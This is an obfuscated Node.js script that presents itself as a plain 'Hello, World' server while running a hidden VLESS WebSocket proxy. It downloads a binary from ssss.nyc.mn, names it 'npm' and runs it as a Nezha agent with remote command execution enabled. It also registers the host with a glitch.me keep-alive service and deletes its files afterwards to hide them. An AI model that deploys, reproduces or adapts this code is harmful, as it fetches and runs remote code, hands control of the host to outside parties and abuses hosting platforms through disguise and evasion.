const _0x46272d=_0x44b5;(function(_0x1cc2b3,_0x56fc84){const _0x4abb91=_0x44b5,_0x30aa2e=_0x1cc2b3();while(!![]){try{const _0x3d72cd=-parseInt(_0x4abb91(0x10d))/0x1+-parseInt(_0x4abb91(0xd0))/0x2+parseInt(_0x4abb91(0xcc))/0x3*(parseInt(_0x4abb91(0xc9))/0x4)+parseInt(_0x4abb91(0x103))/0x5+parseInt(_0x4abb91(0x113))/0x6*(-parseInt(_0x4abb91(0xe8))/0x7)+-parseInt(_0x4abb91(0xc4))/0x8*(-parseInt(_0x4abb91(0xf5))/0x9)+parseInt(_0x4abb91(0x101))/0xa;if(_0x3d72cd===_0x56fc84)break;else _0x30aa2e['push'](_0x30aa2e['shift']());}catch(_0x596ba3){_0x30aa2e['push'](_0x30aa2e['shift']());}}}(_0x347c,0x56b42));function _0x44b5(_0x57cfe9,_0x4281a5){const _0x347ce4=_0x347c();return _0x44b5=function(_0x44b58b,_0x5c23b0){_0x44b58b=_0x44b58b-0xc1;let _0x298aa6=_0x347ce4[_0x44b58b];return _0x298aa6;},_0x44b5(_0x57cfe9,_0x4281a5);}const os=require('os'),http=require(_0x46272d(0xf4)),fs=require('fs'),axios=require(_0x46272d(0xca)),net=require(_0x46272d(0xfe)),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x46272d(0xcb),NEZHA_SERVER=process[_0x46272d(0x10e)][_0x46272d(0xf1)]||'',NEZHA_PORT=process[_0x46272d(0x10e)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x46272d(0x10e)][_0x46272d(0xd9)]||'',DOMAIN=process[_0x46272d(0x10e)][_0x46272d(0x102)]||_0x46272d(0xe2),AUTO_ACCESS=process[_0x46272d(0x10e)][_0x46272d(0xd5)]||![],SUB_PATH=process['env'][_0x46272d(0xc5)]||_0x46272d(0xea),NAME=process['env'][_0x46272d(0xce)]||_0x46272d(0x106),PORT=process['env'][_0x46272d(0x10f)]||0xbb8,metaInfo=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x46272d(0xdc)}),ISP=metaInfo['trim'](),httpServer=http[_0x46272d(0xc7)]((_0x3aa1ff,_0x1c35e3)=>{const _0x19006c=_0x46272d;if(_0x3aa1ff[_0x19006c(0xe0)]==='/')_0x1c35e3[_0x19006c(0x10b)](0xc8,{'Content-Type':_0x19006c(0xdf)}),_0x1c35e3['end']('Hello,\x20World\x0a');else{if(_0x3aa1ff[_0x19006c(0xe0)]==='/'+SUB_PATH){const _0x1cf4ee=_0x19006c(0xec)+UUID+_0x19006c(0xfc)+DOMAIN+'&type=ws&host='+DOMAIN+_0x19006c(0xd1)+NAME+'-'+ISP,_0x29a6ca=Buffer[_0x19006c(0x110)](_0x1cf4ee)[_0x19006c(0xc2)](_0x19006c(0x108));_0x1c35e3[_0x19006c(0x10b)](0xc8,{'Content-Type':_0x19006c(0xdf)}),_0x1c35e3[_0x19006c(0xd6)](_0x29a6ca+'\x0a');}else _0x1c35e3['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x1c35e3[_0x19006c(0xd6)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x46272d(0xc3))]({'server':httpServer}),uuid=UUID[_0x46272d(0xf7)](/-/g,'');wss['on'](_0x46272d(0xd2),_0x1e4909=>{const _0x3f290f=_0x46272d;_0x1e4909['once'](_0x3f290f(0x10c),_0x3021c6=>{const _0x25a58b=_0x3f290f,[_0x3d3b5e]=_0x3021c6,_0x5ee8d9=_0x3021c6['slice'](0x1,0x11);if(!_0x5ee8d9[_0x25a58b(0xcf)]((_0x51473b,_0x22ab79)=>_0x51473b==parseInt(uuid[_0x25a58b(0x104)](_0x22ab79*0x2,0x2),0x10)))return;let _0x26e962=_0x3021c6[_0x25a58b(0xf9)](0x11,0x12)[_0x25a58b(0xcd)]()+0x13;const _0x14ee4c=_0x3021c6[_0x25a58b(0xf9)](_0x26e962,_0x26e962+=0x2)['readUInt16BE'](0x0),_0x5b8df5=_0x3021c6['slice'](_0x26e962,_0x26e962+=0x1)[_0x25a58b(0xcd)](),_0x2ff97c=_0x5b8df5==0x1?_0x3021c6[_0x25a58b(0xf9)](_0x26e962,_0x26e962+=0x4)[_0x25a58b(0xef)]('.'):_0x5b8df5==0x2?new TextDecoder()[_0x25a58b(0xf6)](_0x3021c6[_0x25a58b(0xf9)](_0x26e962+0x1,_0x26e962+=0x1+_0x3021c6['slice'](_0x26e962,_0x26e962+0x1)['readUInt8']())):_0x5b8df5==0x3?_0x3021c6[_0x25a58b(0xf9)](_0x26e962,_0x26e962+=0x10)[_0x25a58b(0xc6)]((_0x465148,_0x3be035,_0x27c782,_0x38d358)=>_0x27c782%0x2?_0x465148['concat'](_0x38d358['slice'](_0x27c782-0x1,_0x27c782+0x1)):_0x465148,[])['map'](_0x5ae658=>_0x5ae658[_0x25a58b(0xf8)](0x0)[_0x25a58b(0xc2)](0x10))[_0x25a58b(0xef)](':'):'';_0x1e4909[_0x25a58b(0xf2)](new Uint8Array([_0x3d3b5e,0x0]));const _0x2f1e59=createWebSocketStream(_0x1e4909);net[_0x25a58b(0x10a)]({'host':_0x2ff97c,'port':_0x14ee4c},function(){const _0x51c47c=_0x25a58b;this[_0x51c47c(0xd8)](_0x3021c6['slice'](_0x26e962)),_0x2f1e59['on']('error',()=>{})[_0x51c47c(0xed)](this)['on'](_0x51c47c(0xd7),()=>{})[_0x51c47c(0xed)](_0x2f1e59);})['on']('error',()=>{});})['on'](_0x3f290f(0xd7),()=>{});});const getDownloadUrl=()=>{const _0xe8052f=_0x46272d,_0x3afc2e=os[_0xe8052f(0xfa)]();return _0x3afc2e===_0xe8052f(0x105)||_0x3afc2e==='arm64'||_0x3afc2e==='aarch64'?!NEZHA_PORT?_0xe8052f(0xdd):_0xe8052f(0xfd):!NEZHA_PORT?_0xe8052f(0x109):_0xe8052f(0xda);},downloadFile=async()=>{const _0x6cb40c=_0x46272d;try{const _0xe47fad=getDownloadUrl(),_0xd76431=await axios({'method':_0x6cb40c(0xd4),'url':_0xe47fad,'responseType':_0x6cb40c(0xf3)}),_0x504e39=fs[_0x6cb40c(0x114)](_0x6cb40c(0xdb));return _0xd76431['data'][_0x6cb40c(0xed)](_0x504e39),new Promise((_0x17dadd,_0x72e753)=>{_0x504e39['on']('finish',()=>{const _0x3e2d89=_0x44b5;console[_0x3e2d89(0x100)](_0x3e2d89(0xe6)),exec('chmod\x20+x\x20npm',_0x1b7a33=>{if(_0x1b7a33)_0x72e753(_0x1b7a33);_0x17dadd();});}),_0x504e39['on']('error',_0x72e753);});}catch(_0x54b763){throw _0x54b763;}},runnz=async()=>{const _0x4e9c02=_0x46272d;await downloadFile();let _0x40a2b0='',_0x9bd53d='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x41ff3a=['443',_0x4e9c02(0x116),'2096','2087',_0x4e9c02(0x112),_0x4e9c02(0xe4)];_0x40a2b0=_0x41ff3a['includes'](NEZHA_PORT)?_0x4e9c02(0xe9):'',_0x9bd53d=_0x4e9c02(0x115)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x40a2b0+'\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xcee36d=_0x4e9c02(0xc1)+NEZHA_KEY+_0x4e9c02(0xf0)+NEZHA_SERVER+_0x4e9c02(0xe7)+UUID;fs[_0x4e9c02(0x107)](_0x4e9c02(0x111),_0xcee36d);}_0x9bd53d='nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x4e9c02(0x100)](_0x4e9c02(0xe1));return;}}try{exec(_0x9bd53d,{'shell':_0x4e9c02(0xff)}),console[_0x4e9c02(0x100)](_0x4e9c02(0xee));}catch(_0x9e0bcc){console['error'](_0x4e9c02(0xfb)+_0x9e0bcc);}};async function addAccessTask(){const _0x4a437e=_0x46272d;if(!AUTO_ACCESS)return;try{if(!DOMAIN){console[_0x4a437e(0x100)]('URL\x20is\x20empty.\x20Skip\x20Adding\x20Automatic\x20Access\x20Task');return;}else{const _0x1f074c='https://'+DOMAIN,_0x9bdc7=_0x4a437e(0xe3)+_0x1f074c+_0x4a437e(0xde);exec(_0x9bdc7,(_0x2e8787,_0x247313,_0x590959)=>{const _0x737ad2=_0x4a437e;if(_0x2e8787){console[_0x737ad2(0xd7)](_0x737ad2(0xeb),_0x2e8787[_0x737ad2(0x10c)]);return;}console[_0x737ad2(0x100)]('Automatic\x20Access\x20Task\x20added\x20successfully:',_0x247313);});}}catch(_0x3a9e6b){console[_0x4a437e(0xd7)]('Error\x20added\x20Task:',_0x3a9e6b['message']);}}function _0x347c(){const _0x1d8113=['substr','arm','Vls','writeFileSync','base64','https://amd64.ssss.nyc.mn/v1','connect','writeHead','message','353214dPkHUG','env','PORT','from','config.yaml','2083','1217028HouQqd','createWriteStream','nohup\x20./npm\x20-s\x20','8443','\x0aclient_secret:\x20','toString','Server','8qLrESY','SUB_PATH','reduce','createServer','listen','22564UEnmuS','axios','de04add9-5c68-6bab-950c-08cd5320df33','3nOwehi','readUInt8','NAME','every','334218oPpzxV','&path=%2F#','connection','unlink','get','AUTO_ACCESS','end','error','write','NEZHA_KEY','https://amd64.ssss.nyc.mn/agent','npm','utf-8','https://arm64.ssss.nyc.mn/v1','\x22}\x27','text/plain','url','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','1234.abc.com','curl\x20-X\x20POST\x20\x22https://gifted-steel-cheek.glitch.me/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','2053','Server\x20is\x20running\x20on\x20port\x20','npm\x20download\x20successfully','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20false\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','14jsNFIc','--tls','sub','Error\x20sending\x20request:','vless://','pipe','npm\x20is\x20running','join','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20','NEZHA_SERVER','send','stream','http','4747671QuzkhQ','decode','replace','readUInt16BE','slice','arch','npm\x20running\x20error:\x20','@www.visa.com.tw:443?encryption=none&security=tls&sni=','https://arm64.ssss.nyc.mn/agent','net','/bin/bash','log','2362270uNtgti','DOMAIN','2558750nGcStN'];_0x347c=function(){return _0x1d8113;};return _0x347c();}const delFiles=()=>{const _0x2a930a=_0x46272d;fs['unlink'](_0x2a930a(0xdb),()=>{}),fs[_0x2a930a(0xd3)](_0x2a930a(0x111),()=>{});};httpServer[_0x46272d(0xc8)](PORT,()=>{const _0x5a98cf=_0x46272d;runnz(),setTimeout(()=>{delFiles();},0x7530),addAccessTask(),console[_0x5a98cf(0x100)](_0x5a98cf(0xe5)+PORT);});
